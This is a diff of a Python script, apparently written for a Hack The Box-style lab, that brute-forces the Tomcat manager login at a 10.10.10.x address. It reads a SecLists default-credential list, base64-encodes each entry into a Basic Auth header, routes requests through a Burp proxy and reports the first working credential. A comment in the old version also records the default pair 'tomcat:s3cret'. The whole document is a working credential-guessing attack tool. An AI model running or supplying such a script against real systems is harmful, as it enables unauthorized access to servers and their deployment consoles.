@@ -3,56 +3,44 @@
 
 from pwn import *
 from base64 import *
-import requests,re,pdb
+import requests,sys,signal,pdb,re
 
 def def_handler(sig,frame):
-	print("\n[!]Saindo...\n")
+	print("\n[!]Exiting...\n")
 	sys.exit(1)
 
-# CTRL + C
+# Ctrl + C
 signal.signal(signal.SIGINT,def_handler)
 
-# Variable_Global
+# Variable_global
 main_url = "http://10.10.10.95:8080/manager/html"
-# user = b"tomcat"
-espa = b":"
-# password = b"s3cret"
-burp = {'http': 'http://127.0.0.1:8080' }
+burp = {"http": "http://127.0.0.1:8080"}
 
 def makeRequest():
-
 	s = requests.session()
 
 	p1 = log.progress("Brute Force Tomcat")
-	p1.status("Start Brute Force")
+	p1.status("Start")
+	time.sleep(1)
 
-	sleep(2)
+	files = open("/usr/share/wordlists/Seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt", "rb")
 
-	fu = open('/tmp/tomworduser','rb').read().splitlines()
+	for file in files.readlines():
 
-	fp = open('/tmp/tomwordpass','rb').read().splitlines()
+		file = file.decode().strip()
+		p1.status(f"Testing: {file}")
 
-	for user in fu:
-		for password in fp:
+		passwd = b64encode(file.encode())
 
-			user = user.strip()
-			password = password.strip()
+		header = {
+			'Authorization': f'Basic {passwd.decode()}'
+		}
 
-			p1.status(f"Testing {user.decode()}:{password.decode()}")
+		r = s.get(main_url, headers=header, proxies=burp)
 
-			base = b64encode(user + espa + password)
-
-			base = base.decode()
-			
-			head = {
-				'Authorization': f"Basic {base}"
-			}
-
-			r = s.get(main_url, headers=head, proxies=burp)
-
-			if r.status_code == 200:
-				log.info(f"Sucess {user.decode().strip()}:{password.decode().strip()}")
+		if r.status_code == 200:
+			log.success(f"Credential: {file}")
+			break
 
 if __name__ == '__main__':
-
 	makeRequest()
